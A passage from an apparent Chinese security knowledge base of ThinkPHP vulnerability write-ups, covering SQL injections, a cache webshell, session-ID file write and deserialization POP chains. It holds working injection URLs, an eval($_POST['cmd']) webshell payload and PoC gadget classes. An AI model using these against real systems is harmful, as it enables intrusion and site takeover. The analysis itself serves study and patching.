sql注入漏洞/media/rId26.png) 漏洞分析 sql注入漏洞/media/rId28.png) 首先在官方发布的 5.1.9 版本更新说明中，发现其中提到该版本包含了一个安全更新，我们可以查阅其 commit 记录，发现其删除了 parseArrayData 方法，这处 case 语句之前出现过 insert 注入，所以比较可疑。 sql注入漏洞/media/rId29.png) 接着我们直接跟着上面的攻击 payload 来看看漏洞原理。首先， payload 数据经过 ThinkPHP 内置方法的过滤后（不影响我们的 payload ），直接进入了 Query 类的 update 方法，该方法调用了 Connection 类的 update 方法，该方法又调用了 $this->builder 的 insert 方法，这里的 $this->builder 为 \\think\\db\\builder\\Mysql 类，该类继承于 Builder 类，代码如下： sql注入漏洞/media/rId30.png) 在 Builder 类的 update 方法中，调用了 parseData 方法。这个方法中的 case 语句之前存在 SQL注入漏洞 ，现已修复，然而却多了 default 代码段，而这段代码也是在新版本中被删除的。 sql注入漏洞/media/rId31.png) 我们跟进到 parseArrayData 方法，发现其中又将可控变量进行拼接，其变量来源均来自用户输入。之后的过程就和之前的 insert 注入一样，用 str_replace 将变量填充到 SQL 语句中，最终执行，导致 SQL注入漏洞 。 sql注入漏洞/media/rId32.png) 上面 第15行 的 $result 相当于 $a(\\'$b($c)\\') 其中 $a、$b、$c 均可控。最后形成的 SQL 语句如下： UPDATE `users` SET `username` = $a('$b($c)') WHERE `id` = 1; 接着我们想办法闭合即可。我们令 $a = updatexml(1,concat(0x7,user(),0x7e),1)\\^ 、 $b = 0 、 $c = 1 ，即： UPDATE `users` SET `username` = updatexml(1,concat(0x7,user(),0x7e),1)^('0(1)') WHERE `id` = 1 漏洞修复 官方修复方法比较暴力，直接将 parseArrayData 方法删除了。 sql注入漏洞/media/rId34.png) 攻击总结 最后，再通过一张攻击流程图来回顾整个攻击过程。 sql注入漏洞/media/rId36.png) 参考链接 https://github.com/Mochazz/ThinkPHP-Vuln Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:06:40 "},"Web安全/Thinkphp/Thinkphp 5.x 漏洞/Thinkphp = 5.0.10 sql注入漏洞/Thinkphp = 5.0.10 sql注入漏洞.html":{"url":"Web安全/Thinkphp/Thinkphp 5.x 漏洞/Thinkphp = 5.0.10 sql注入漏洞/Thinkphp = 5.0.10 sql注入漏洞.html","title":"Thinkphp = 5.0.10 sql注入漏洞","keywords":"","body":"Thinkphp = 5.0.10 一、漏洞简介 本篇文章，将分析 ThinkPHP 中存在的 SQL注入 漏洞（ select 方法注入）。本次漏洞存在于 Mysql 类的 parseWhereItem 方法中。由于程序没有对数据进行很好的过滤，直接将数据拼接进 SQL 语句。再一个， Request 类的 filterValue 方法漏过滤 NOT LIKE 关键字，最终导致 SQL注入漏洞 的产生。 二、漏洞影响 ThinkPHP=5.0.10 三、复现过程 漏洞环境 通过以下命令获取测试环境代码： composer create-project --prefer-dist topthink/think=5.0.10 tpdemo 将 composer.json 文件的 require 字段设置成如下： \"require\": { \"php\": \">=5.4.0\", \"topthink/framework\": \"5.0.10\" }, 然后执行 composer update ，并将 application/index/controller/Index.php 文件代码设置如下： get('username/a'); $result = db('users')->where(['username' => $username])->select(); var_dump($result); } } 在 config/database.php 文件中配置数据库相关信息，并开启 config/app.php 中的 app_debug 和 app_trace 。创建数据库信息如下： create database tpdemo; use tpdemo; create table users( id int primary key auto_increment, username varchar(50) not null ); insert into users(id,username) values(1,'mochazz'); 访问 http://localhost:8000/index/index/index?username\\[0\\]=not like&username[1][0]=%%&username[1][1]=233&username[2]=) union select 1,user()# 链接，即可触发 SQL注入漏洞 。（没开启 app_debug 是无法看到 SQL 报错信息的） 漏洞分析 首先在官方发布的 5.0.11 版本更新说明中，发现其中提到该版本包含了一个安全更新，我们可以查阅其 commit 记录，发现其修改的 Request.php 文件代码比较可疑。 接着我们直接跟着上面的攻击 payload 来看看漏洞原理。首先，不管以哪种方式传递数据给服务器，这些数据在 ThinkPHP 中都会经过 Request 类的 input 方法。数据不仅会被强制类型转换，还都会经过 filterValue 方法的处理。该方法是用来过滤表单中的表达式，但是我们仔细看其代码，会发现少过滤了 NOT LIKE ，而本次漏洞正是利用了这一点。 我们回到处理 SQL 语句的方法上。首先程序先调用 Query 类的 where 方法，通过其 parseWhereExp 方法分析查询表达式，然后再返回并继续调用 select 方法准备开始构建 select 语句。 上面的 $this->builder 为 \\think\\db\\builder\\Mysql 类，该类继承于 Builder 类，所以接着会调用 Builder 类的 select 方法。在 select 方法中，程序会对 SQL 语句模板用变量填充，其中用来填充 %WHERE% 的变量中存在用户输入的数据。我们跟进这个 where 分析函数，会发现其会调用生成查询条件 SQL 语句的 buildWhere 函数。 继续跟进 buildWhere 函数，发现用户可控数据又被传入了 parseWhereItem where子单元分析函数，该函数的返回结果存储在 $str 变量中，并被拼接进 SQL 语句。（下图 第16、20行） 我们跟进 parseWhereItem 方法，发现当操作符等于 NOT LIKE 时，程序所使用的 MYSQL 逻辑操作符竟然可由用户传来的变量控制（下图 第23行 ），这样也就直接导致了 SQL注入漏洞 的发生。 正是由于 ThinkPHP 官方的 filterValue 方法漏过滤了 NOT LIKE ，同时 MYSQL 逻辑操作由用户变量控制，使得这一漏洞可以被利用。 漏洞修复 在 5.0.10 之后的版本，官方的修复方法是：在 Request.php 文件的 filterValue 方法中，过滤掉 NOT LIKE 关键字。而在 5.0.10 之前的版本中，这个漏洞是不存在的，但是其代码也没有过滤掉 NOT LIKE 关键字，这是为什么呢？经过调试，发现原来在 5.0.10 之前的版本中，其默认允许的表达式中不存在 not like （注意空格），所以即便攻击者可以通过外部控制该操作符号，也无法完成攻击。（会直接进入下入157行，下图是 5.0.9 版本的代码）相反， 5.0.10 版本其默认允许的表达式中，存在 not like ，因而可以触发漏洞。 攻击总结 最后，再通过一张攻击流程图来回顾整个攻击过程。 参考链接 https://github.com/Mochazz/ThinkPHP-Vuln Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:06:54 "},"Web安全/Thinkphp/Thinkphp 5.x 漏洞/Thinkphp 5.0.24 mysql账号密码泄露/Thinkphp 5.0.24 mysql账号密码泄露.html":{"url":"Web安全/Thinkphp/Thinkphp 5.x 漏洞/Thinkphp 5.0.24 mysql账号密码泄露/Thinkphp 5.0.24 mysql账号密码泄露.html","title":"Thinkphp 5.0.24 mysql账号密码泄露","keywords":"","body":"Thinkphp 5.0.24 mysql账号密码泄露 一、漏洞简介 Thinkphp 5.0.24 在开启debug的模式下，可通过高线程爆破mysql导致tp报错泄露mysql账号密码。 二、漏洞影响 Thinkphp 5.0.24 三、复现过程 利用条件： 开启debug模式 mysql开启外连 通过MySQL爆破工具，来建立大量链接 连接数到达一定的程度以后就会抛出错误 导致泄漏出MySql帐号密码 修复方案 关闭tp5 debug选项（推荐） 注释掉thinkphp\\library\\think\\db\\Connection.php 中305行附近的throw $e;（不推荐） 参考链接 https://zhuanlan.zhihu.com/p/131414060 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:06:53 "},"Web安全/Thinkphp/Thinkphp 5.x 漏洞/Thinkphp 5.0.5 缓存漏洞/Thinkphp 5.0.5 缓存漏洞.html":{"url":"Web安全/Thinkphp/Thinkphp 5.x 漏洞/Thinkphp 5.0.5 缓存漏洞/Thinkphp 5.0.5 缓存漏洞.html","title":"Thinkphp 5.0.5 缓存漏洞","keywords":"","body":"Thinkphp 5.0.5 缓存漏洞 一、漏洞简介 二、漏洞影响 Thinkphp 5.0.5 三、复现过程 漏洞分析 漏洞代码与3.2.3差不多，不一样的在缓存目录 protected function getCacheKey($name) { $name = md5($name); if ($this->options['cache_subdir']) { // 使用子目录 $name = substr($name, 0, 2) . DS . substr($name, 2); } if ($this->options['prefix']) { $name = $this->options['prefix'] . DS . $name; } $filename = $this->options['path'] . $name . '.php'; $dir = dirname($filename); if (!is_dir($dir)) { mkdir($dir, 0755, true); } return $filename; } 在index控制器写如下代码： 之后访问 http://www.0-sec.org/public/index.php/Home/indexPOST数据：con=%0aeval($_POST['cmd']);%0d// 最终在 runtime/cache/b0/68931cc450442b63f5b3d276ea4297.php文件生成shell： 之后访问蚁剑 http://www.0-sec.org/runtime/cache/b0/68931cc450442b63f5b3d276ea4297.php 小结 Thinkphp5.0.5 漏洞文件位置(一般审计得出) http://www.0-sec.org/public/index.php/Home/Index/index POST数据 :con=%0d%0aeval($_POST['cmd']);%0d%0a// 缓存文件位置b0文件夹是md5(cache-name)前2位。 http://www.0-sec.org/runtime/cache/b0/b068931cc450442b63f5b3d276ea4297.php 蚁剑连接 参考链接 https://h3art3ars.github.io/2019/12/16/Thinkphp3-2-3-5-0-10%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:06:49 "},"Web安全/Thinkphp/Thinkphp 5.x 漏洞/Thinkphp5 全版本 sql注入漏洞/Thinkphp5 全版本 sql注入漏洞.html":{"url":"Web安全/Thinkphp/Thinkphp 5.x 漏洞/Thinkphp5 全版本 sql注入漏洞/Thinkphp5 全版本 sql注入漏洞.html","title":"Thinkphp5 全版本 sql注入漏洞","keywords":"","body":"Thinkphp5 全版本 一、漏洞简介 本篇文章，将分析 ThinkPHP 中存在的 SQL注入 漏洞（ select 方法注入）。次漏洞存在于 Mysql 类的 parseWhereItem 方法中。由于程序没有对数据进行很好的过滤，将数据拼接进 SQL 语句，导致 SQL注入漏洞 的产生。 二、漏洞影响 ThinkPHP5全版本 三、复现过程 漏洞环境 通过以下命令获取测试环境代码： composer create-project --prefer-dist topthink/think=5.0.10 tpdemo 将 composer.json 文件的 require 字段设置成如下： \"require\": { \"php\": \">=5.4.0\", \"topthink/framework\": \"5.0.10\" }, 然后执行 composer update ，并将 application/index/controller/Index.php 文件代码设置如下： get('username'); $result = db('users')->where('username','exp',$username)->select(); return 'select success'; } } 在 config/database.php 文件中配置数据库相关信息，并开启 config/app.php 中的 app_debug 和 app_trace 。创建数据库信息如下： create database tpdemo; use tpdemo; create table users( id int primary key auto_increment, username varchar(50) not null ); insert into users(id,username) values(1,'mochazz'); poc http://0-sec.org:8000/index/index/index?username=) union select updatexml(1,concat(0x7,user(),0x7e),1)# 访问链接，即可触发 SQL注入漏洞 。（没开启 app_debug 是无法看到 SQL 报错信息的） 漏洞分析 由于官方根本不认为这是一个漏洞，而认为这是他们提供的一个功能，所以官方并没有对这个问题进行修复。但笔者认为这里的数据过滤还是存在问题的，所以我们还是来分析分析这个漏洞。 程序默认调用 Request 类的 get 方法中会调用该类的 input 方法，但是该方法默认情况下并没有对数据进行很好的过滤，所以用户输入的数据会原样进入框架的 SQL 查询方法中。首先程序先调用 Query 类的 where 方法，通过其 parseWhereExp 方法分析查询表达式，然后再返回并继续调用 select 方法准备开始构建 select 语句。 上面的 $this->builder 为 \\think\\db\\builder\\Mysql 类，该类继承于 Builder 类，所以接着会调用 Builder 类的 select 方法。在 select 方法中，程序会对 SQL 语句模板用变量填充，其中用来填充 %WHERE% 的变量中存在用户输入的数据。我们跟进这个 where 分析函数，会发现其会调用生成查询条件 SQL 语句的 buildWhere 函数。 继续跟进 buildWhere 函数，发现用户可控数据又被传入了 parseWhereItem where子单元分析函数。我们发现当操作符等于 EXP 时，将来自用户的数据直接拼接进了 SQL 语句，最终导致了 SQL注入漏洞 。 漏洞修复 未修复。 攻击总结 最后，再通过一张攻击流程图来回顾整个攻击过程。 参考链接 https://github.com/Mochazz/ThinkPHP-Vuln Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:06:47 "},"Web安全/Thinkphp/Thinkphp 6.x 漏洞/Thinkphp  6.0.2 session id未作过滤导致getshell/Thinkphp  6.0.2 session id未作过滤导致getshell.html":{"url":"Web安全/Thinkphp/Thinkphp 6.x 漏洞/Thinkphp  6.0.2 session id未作过滤导致getshell/Thinkphp  6.0.2 session id未作过滤导致getshell.html","title":"Thinkphp  6.0.2 session id未作过滤导致getshell","keywords":"","body":"Thinkphp \\ 一、漏洞简介 二、漏洞影响 Thinkphp \\ 三、复现过程 漏洞分析 通过diff github上面的6.0.1和6.0.2的代码可以发现，6.0.1在设置session id时未对值进行ctype_alnum()校验，从而导致可以传入任意字符。 传入任意字符会有什么危害？一般来说程序可能会以session id作为文件名来创建对应的session文件，但是到目前为止这只是猜测。看一下保存session是怎么写的。 public function save(): void { $this->clearFlashData(); $sessionId = $this->getId(); if (!empty($this->data)) { $data = $this->serialize($this->data); $this->handler->write($sessionId, $data); } else { $this->handler->delete($sessionId); } $this->init = false; } 先获取sessionid，然后作为第一个参数传入$this->handler->write()。$this->handler在构造函数中被初始化 public function __construct($name, SessionHandlerInterface $handler, array $serialize = null) { $this->name = $name; $this->handler = $handler; if (!empty($serialize)) { $this->serialize = $serialize; } $this->setId(); } 可以看出$handler的类型是SessionHandlerInterface，全局发现这是一个接口，实现这个接口的类有两个，一个是File，一个是Cache。这里以File类为例，我们跟进它的write()方法 public function write(string $sessID, string $sessData): bool { $filename = $this->getFileName($sessID, true); $data = $sessData; if ($this->config['data_compress'] && function_exists('gzcompress')) { //数据压缩 $data = gzcompress($data, 3); } return $this->writeFile($filename, $data); } 这里先通过第一个参数（也就是session id）来构造$filename，然后判断是否需要对session数据进行压缩，默认是不需要的，最后return时调用$this->writeFile()。先看看文件名是如何构造的，跟进$this->getFileName() protected function getFileName(string $name, bool $auto = false): string { if ($this->config['prefix']) { $name = $this->config['prefix'] . DIRECTORY_SEPARATOR . 'sess_' . $name; } else { $name = 'sess_' . $name; } $filename = $this->config['path'] . $name; ... return $filename; } 这里直接将第一个参数拼接到路径的最后。跟进之前的$this->writeFile()方法 protected function writeFile($path, $content): bool { return (bool) file_put_contents($path, $content, LOCK_EX); } 刺激了，这里直接保存了文件。纵观全局，由于程序未对session id进行危险字符判断，只要将session id写为类似于xxxx.php的格式，即可导致session保存成.php文件，从而getshell。 漏洞复现 通过全局搜索setId发现在think/middleware/SessionInit.php:handle():L59发生了调用。 public function handle($request, Closure $next) { // Session初始化 $varSessionId = $this->app->config->get('session.var_session_id'); $cookieName = $this->session->getName(); if ($varSessionId && $request->request($varSessionId)) { $sessionId = $request->request($varSessionId); } else { $sessionId = $request->cookie($cookieName); } if ($sessionId) { $this->session->setId($sessionId); } ... 由于session.var_session_id默认是空，这里的$sessionId的值由$request->cookie($cookieName)获得，$cookieName经过跟进后发现默认是PHPSESSID。 因此我们只要设置Cookie中的PHPSESSID的值为1234567890123456789012345678.php即可。 我们在index控制器中添加如下action public function testsession2(){ $username = Request::get('name'); Session::set('username', $username); return 'hi'; } 用于获取name参数，并将之设置到session中。 访问url：http://127.0.0.1/tp6/public/index.php/index/testsession2?name= 访问session文件，一般位于项目根目录下的./runtime/session/文件夹下，也就是/runtime/session/sess_1234567890123456789012345678.php 参考链接 https://xz.aliyun.com/t/7109 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:07:15 "},"Web安全/Thinkphp/Thinkphp 6.x 漏洞/Thinkphp 6.0 任意文件写入pop链/Thinkphp 6.0 任意文件写入pop链.html":{"url":"Web安全/Thinkphp/Thinkphp 6.x 漏洞/Thinkphp 6.0 任意文件写入pop链/Thinkphp 6.0 任意文件写入pop链.html","title":"Thinkphp 6.0 任意文件写入pop链","keywords":"","body":"Thinkphp 6.0 任意文件写入pop链 一、漏洞简介 需要知晓绝对路径 二、漏洞影响 Thinkphp 6.0 三、复现过程 环境搭建 ThinkPHP6.0.2 PHP7.2 漏洞分析 POP链： League\\Flysystem\\Cached\\Storage\\AbstractCache --> destruct() League\\Flysystem\\Cached\\Storage\\Adapter --> save() League\\Flysystem\\Adapter\\Local --> write() vendor/league/flysystem-cached-adapter/src/Storage/AbstractCache.php 因AbstractCache类为抽象类，需找到其实现子类，且要有save()方法 成功找到：vendor/league/flysystem-cached-adapter/src/Storage/Adapter.php $contents决定文件写入内容，显然可向$this->complete或$this->expire写入具体内容即可 接下来需找到具有write()方法的类，vendor/league/flysystem/src/Adapter/Local.php中Local类符合条件 但ensureDirectory()对利用造成了影响，将对目录进行检测，因而造成必须使用绝对路径 漏洞复现 根据分析写出poc 该利用链较为鸡肋，要求必须知晓写入文件的绝对路径 autosave = false; $this->cache = ['test']; $this->complete = [\"axin\"=>\"\"]; } } class Adapter extends AbstractCache{ protected $adapter; protected $file; protected $expire = null; function __construct(){ parent::__construct(); $this->adapter = new Local(); $this->file = \"var/www/html/index.php\"; #$this->file = \"://WampServer/www/tp/tp6.0.1/public/index.php\"; #winsows下目录 $this->expire = 123; } } namespace League\\Flysystem\\Adapter; abstract class AbstractAdapter{ protected $pathPrefix; function __construct(){ $this->pathPrefix = \"/\"; #$this->pathPrefix = \"D\"; #windows下目录 } } class Local extends AbstractAdapter{ } use League\\Flysystem\\Cached\\Storage\\Adapter; echo base64_encode(serialize(new Adapter())); 效果演示：自己构造一个反序列化输入点，发送请求(页面的输出是我自己方便调试打印的) 文件成功写入： 参考链接 http://pines404.online/2020/01/20/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/ThinkPHP/ThinkPHP6.0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE(%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5)%E5%88%86%E6%9E%90/ https://www.anquanke.com/post/id/194269 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:07:10 "},"Web安全/Thinkphp/Thinkphp 6.x 漏洞/Thinkphp 6.1 任意文件创建&删除漏洞/Thinkphp 6.1 任意文件创建&删除漏洞.html":{"url":"Web安全/Thinkphp/Thinkphp 6.x 漏洞/Thinkphp 6.1 任意文件创建&删除漏洞/Thinkphp 6.1 任意文件创建&删除漏洞.html","title":"Thinkphp 6.1 任意文件创建&删除漏洞","keywords":"","body":"Thinkphp 6.1 任意文件创建&删除漏洞 一、漏洞简介 漏洞允许攻击者在启用session的目标环境下创建任意文件以及删除任意文件（仅Windows下），在特定情况下还可以getshell。 二、漏洞影响 ThinkPHP\\ 三、复现过程 环境搭建 ThinkPHP6.0.1+PHP7.2+Windows composer create-project topthink/think tp6.0.1 #修改json后 composer update 开启session middleware.php中添加 \\think\\middleware\\SessionInit::class 控制器 public function session(){ session('name', '');#模拟写入内容可控 $SessionName = config('session.name'); $SessionID = cookie($SessionName); echo $SessionID; } 漏洞分析 官方修复vendor/topthink/framework/src/think/session/Store.php中setId()方法 在修复之前，参数id为32位时直接将其值赋值给$this->id 回溯该方法调用情况，在vendor/topthink/framework/src/think/middleware/SessionInit.php中发现调用 同时从图中可知$sessionId的值来源途径之一为cookie中获取，而$cookieName默认值为\"PHPSESSID\" handle()方法作用是初始化session，在下面发现end()方法，在响应过程中一定会触发end()方法，因为在框架入口文件index.php中已经写明： end()中存在save()方法： public function end(Response $response) { $this->session->save(); } save()位于vendor/topthink/framework/src/think/session/Store.php 此处$sessionId值可来源于cookie['PHPSESSID']，可控，但 $this->data可决定创建文件或删除文件，经过调试得知，其值来源于程序写入session的值，例如： session(\"PHPSESSID\",\"admin\"); 则$this->data值为\"admin\"，因此如果写入session可控，则可写入任意内容文件。 写入write()和创建文件delete()均是接口方法 在程序处理过程中肯定会涉及其他类，因此搜索实现了该接口的类，发现： vendor/topthink/framework/src/think/session/driver/File.php符合条件 漏洞复现 在上文write()方法中，文件名$filename经过了getFIleName()的处理，而该方法会在传入参数前添加\"sess_\"，也就是说文件名后部分可控，这是比较重要的一个点。 **任意文件删除：**删除public目录下aaaaaaaaaaa.php 需开启session，且仅Windows下可行 文件写入： 要求开启session，且写入session可控 session('name', ''); 写入和删除文件时的测试： #以下均可行，系统将sess_视作一个目录 file_put_contents(\"D:\\tp6.0.1\\runtime\\session\\sess_/../../../public/aa.php\",1) include \"D:\\tp6.0.1\\runtime\\session\\sess_/../../../public/aa.php\" #unlink()有区别：Windows下可行,Linux下无法识别目录 unlink(\"D:\\tp6.0.1\\runtime\\session\\sess_/../../../public/aa.php\")#成功删除 unlink(\"/var/www/html/runtime\\session\\sess_/../../../public/aa.php\")#删除失败 参考链接 http://pines404.online/2020/01/21/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/ThinkPHP/ThinkPHP6.0.1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%9B%E5%BB%BA%E5%92%8C%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:07:12 "},"Web安全/Thinkphp/Thinkphp 反序列化漏洞/Thinkphp 5.0.24 反序列化漏洞/Thinkphp 5.0.24 反序列化漏洞.html":{"url":"Web安全/Thinkphp/Thinkphp 反序列化漏洞/Thinkphp 5.0.24 反序列化漏洞/Thinkphp 5.0.24 反序列化漏洞.html","title":"Thinkphp 5.0.24 反序列化漏洞","keywords":"","body":"Thinkphp 5.0.24 反序列化（任意文件写入）漏洞 一、漏洞简介 该漏洞只能在linux服务器上使用，win无法适用。 二、漏洞影响 Thinkphp 5.0.24 三、复现过程 漏洞分析 这个漏洞是框架的反序列化漏洞，只有二次开发实现了反序列化才可以利用，所以先构造漏洞代码，在/application/index/controller/Index.php中添加如下代码 class Index { public function index() { echo \"Welcome thinkphp 5.0.24\"; unserialize(base64_decode($_GET['a'])); } } Thinkphp 5.0.x反序列化最后触发RCE，要调用的Request类__call方法，所以直接找可用的__call方法 这里选择了Output类(/thinkphp/library/think/console/Output.php)，因为其中的block可以当作跳板 public function __call($method, $args) { if (in_array($method, $this->styles)) { array_unshift($args, $method); return call_user_func_array([$this, 'block'], $args); } if ($this->handle && method_exists($this->handle, $method)) { return call_user_func_array([$this->handle, $method], $args); } else { throw new Exception('method not exists:' . __CLASS__ . '->' . $method); } } 从头开始分析，首先全局搜索__destruct，选择Windows类(/thinkphp/library/think/process/pipes/Windows.php)，代码如下 public function __destruct() { $this->close(); $this->removeFiles(); } 跟进removeFiles private function removeFiles() { foreach ($this->files as $filename) { if (file_exists($filename)) { @unlink($filename); } } $this->files = []; } file_exists可以触发__tostring，所以寻找__tostring，找到了Model类(/thinkphp/library/think/Model.php) public function __toString() { return $this->toJson(); } 跟进toJson public function toJson($options = JSON_UNESCAPED_UNICODE) { return json_encode($this->toArray(), $options); } 跟进toArray public function toArray() { $item = []; $visible = []; $hidden = []; $data = array_merge($this->data, $this->relation); ... // 追加属性（必须定义获取器） if (!empty($this->append)) { foreach ($this->append as $key => $name) { if (is_array($name)) { ... } elseif (strpos($name, '.')) { ... } else { $relation = Loader::parseName($name, 1, false); if (method_exists($this, $relation)) { $modelRelation = $this->$relation(); $value = $this->getRelationData($modelRelation); if (method_exists($modelRelation, 'getBindAttr')) { $bindAttr = $modelRelation->getBindAttr(); if ($bindAttr) { foreach ($bindAttr as $key => $attr) { $key = is_numeric($key) ? $attr : $key; if (isset($this->data[$key])) { throw new Exception('bind attr has exists:' . $key); } else { $item[$key] = $value ? $value->getAttr($attr) : null; } } continue; } } $item[$name] = $value; } else { $item[$name] = $this->getAttr($name); } } } } return !empty($item) ? $item : []; } 由于我们的目的是执行__call，所以要找函数调用的点，在toArray里有三处 然后看这三处哪里可控，经调试第三处可控，需要满足的条件是 if (!empty($this->append)) if (method_exists($this, $relation)) if (method_exists($modelRelation, 'getBindAttr')) if ($bindAttr) 且不满足 if (is_array($name)) elseif (strpos($name, '.')) if (isset($this->data[$key])) 才能够进入到第三处，首先需要满足$relation是Model内的方法，然后经过如下赋值 $modelRelation = $this->$relation(); $value = $this->getRelationData($modelRelation); 需要满足$modelRelation可控，经过查找，可以将$modelRelation设为getError public function getError() { return $this->error; } 然后跟进getRelationDate protected function getRelationData(Relation $modelRelation) { if ($this->parent && !$modelRelation->isSelfRelation() && get_class($modelRelation->getModel()) == get_class($this->parent)) { $value = $this->parent; } else { // 首先获取关联数据 if (method_exists($modelRelation, 'getRelation')) { $value = $modelRelation->getRelation(); } else { throw new BadMethodCallException('method not exists:' . get_class($modelRelation) . '-> getRelation'); } } return $value; } 这里需要$modelRelation为Relation类型。全局查找getRelation方法且为Relation类型的类，找到了HasOne(/thinkphp/library/think/model/relation/HasOne.php) public function getRelation($subRelation = '', $closure = null) { // 执行关联定义方法 $localKey = $this->localKey; if ($closure) { call_user_func_array($closure, [ & $this->query]); } // 判断关联类型执行查询 $relationModel = $this->query ->removeWhereField($this->foreignKey) ->where($this->foreignKey, $this->parent->$localKey) ->relation($subRelation) ->find(); if ($relationModel) { $relationModel->setParent(clone $this->parent); } return $relationModel; } 可以看到这些条件都是满足的，然后看getBindAttr，发现在OneToOne类中是可控的 public function getBindAttr() { return $this->bindAttr; } 所以代码执行到 $item[$key] = $value ? $value->getAttr($attr) : null; 就可以调用Output类的__call方法，调用payload如下 namespace think{ use think\\console\\Output; use think\\model\\relation\\HasOne; abstract class Model{ protected $relation; protected $append = [\"1\"]; protected $error; protected $parent; public function __construct() { $this->parent = new Output(); $this->relation = [\"getError\"=>\"getError\"]; $this->append = [\"getError\"=>\"getError\"]; $this->error = new HasOne(); $this->data = [\"key\"=>\"ls\"]; ; } } } namespace think\\db{ use think\\console\\Output; class Query { protected $model; public function __construct() { $this->model = new Output(); } } } namespace think\\model\\relation{ use think\\db\\Query; use think\\model\\Relation; abstract class OneToOne extends Relation { protected $query; protected $bindAttr = []; public function __construct() { } } class HasOne extends OneToOne { protected $query; protected $bindAttr = []; public function __construct() { $this->query = new Query(); $this->bindAttr = [\"1\"=>\"1\"]; } } } 然后接着看Output，在__call中调用block protected function block($style, $message) { $this->writeln(\"{$message}\"); } 继续writeln public function writeln($messages, $type = self::OUTPUT_NORMAL) { $this->write($messages, true, $type); } write public function write($messages, $newline = false, $type = self::OUTPUT_NORMAL) { $this->handle->write($messages, $newline, $type); } 而$this->handle是可控的，继续全局搜索write，寻找可控的点，找到了/thinkphp/library/think/session/driver/Memcached.php public function write($sessID, $sessData) { return $this->handler->set($this->config['session_name'] . $sessID, $sessData, $this->config['expire']); } 这样就有找到了一个跳板set，然后继续找可以写入文件的方式，找到了/thinkphp/library/think/cache/driver/File.php public function set($name, $value, $expire = null) { if (is_null($expire)) { $expire = $this->options['expire']; } if ($expire instanceof \\DateTime) { $expire = $expire->getTimestamp() - time(); } $filename = $this->getCacheKey($name, true); if ($this->tag && !is_file($filename)) { $first = true; } $data = serialize($value); if ($this->options['data_compress'] && function_exists('gzcompress')) { //数据压缩 $data = gzcompress($data, 3); } $data = \"\\n\" . $data; $result = file_put_contents($filename, $data); if ($result) { isset($first) && $this->setTagItem($filename); clearstatcache(); return true; } else { return false; } } 此处$filename可控，跟进getCacheKey protected function getCacheKey($name, $auto = false) { $name = md5($name); if ($this->options['cache_subdir']) { // 使用子目录 $name = substr($name, 0, 2) . DS . substr($name, 2); } if ($this->options['prefix']) { $name = $this->options['prefix'] . DS . $name; } $filename = $this->options['path'] . $name . '.php'; $dir = dirname($filename); if ($auto && !is_dir($dir)) { mkdir($dir, 0755, true); } return $filename; } 回来继续看$data，从传入的$value获取，但是在之前writeln处已经传入了true，而且不可控，只能继续往下看，可以看到当成功写入文件时，会调用setTagItem方法，跟进 protected function setTagItem($name) { if ($this->tag) { $key = 'tag_' . md5($this->tag); $this->tag = null; if ($this->has($key)) { $value = explode(',', $this->get($key)); $value[] = $name; $value = implode(',', array_unique($value)); } else { $value = $name; } $this->set($key, $value, 0); } } 又调用了一次set，且此处两个参数都是可控的，所以可以在文件名处搞事情，通过编码然后将文件名写入shell中 poc files = [new Pivot()]; } } namespace think\\model;#Relation use think\\db\\Query; abstract class Relation{ protected $selfRelation; protected $query; function __construct(){ $this->selfRelation = false; $this->query = new Query();#class Query } } namespace think\\model\\relation;#OneToOne HasOne use think\\model\\Relation; abstract class OneToOne extends Relation{ function __construct(){ parent::__construct(); } } class HasOne extends OneToOne{ protected $bindAttr = []; function __construct(){ parent::__construct(); $this->bindAttr = [\"no\",\"123\"]; } } namespace think\\console;#Output use think\\session\\driver\\Memcached; class Output{ private $handle = null; protected $styles = []; function __construct(){ $this->handle = new Memcached();//目的调用其write() $this->styles = ['getAttr']; } } namespace think;#Model use think\\model\\relation\\HasOne; use think\\console\\Output; use think\\db\\Query; abstract class Model{ protected $append = []; protected $error; public $parent;#修改处 protected $selfRelation; protected $query; protected $aaaaa; function __construct(){ $this->parent = new Output();#Output对象,目的是调用__call() $this->append = ['getError']; $this->error = new HasOne();//Relation子类,且有getBindAttr() $this->selfRelation = false;//isSelfRelation() $this->query = new Query(); } } namespace think\\db;#Query use think\\console\\Output; class Query{ protected $model; function __construct(){ $this->model = new Output(); } } namespace think\\session\\driver;#Memcached use think\\cache\\driver\\File; class Memcached{ protected $handler = null; function __construct(){ $this->handler = new File();//目的调用File->set() } } namespace think\\cache\\driver;#File class File{ protected $options = []; protected $tag; function __construct(){ $this->options = [ 'expire' => 0, 'cache_subdir' => false, 'prefix' => '', 'path' => 'php://filter/write=string.rot13/resource=./', 'data_compress' => false, ]; $this->tag = true; } } namespace think\\model; use think\\Model; class Pivot extends Model{ } use think\\process\\pipes\\Windows; echo base64_encode(serialize(new Windows())); 该poc仅可在linux下使用，Windows对文件名有限制。 生成文件名规则： md5('tag_'.md5($this->tag)) 即: md5('tag_c4ca4238a0b923820dcc509a6f75849b') =>3b58a9545013e88c7186db11bb158c44 => + 3b58a9545013e88c7186db11bb158c44 最终文件名： 3b58a9545013e88c7186db11bb158c44.php 在漏洞利用时需注意目录读写权限，可先控制options['path'] = './demo/'，利用框架创建一个755文件夹（前提是具有权限） 我们可以稍微修改下 payload 用于创建一个 0755 权限的目录（这里利用的是 think\\cache\\driver\\File:getCacheKey() 中的 mkdir 函数），然后再往这个目录写文件。 poc 创建demo目录 files = [new Pivot()]; } } namespace think\\model;#Relation use think\\db\\Query; abstract 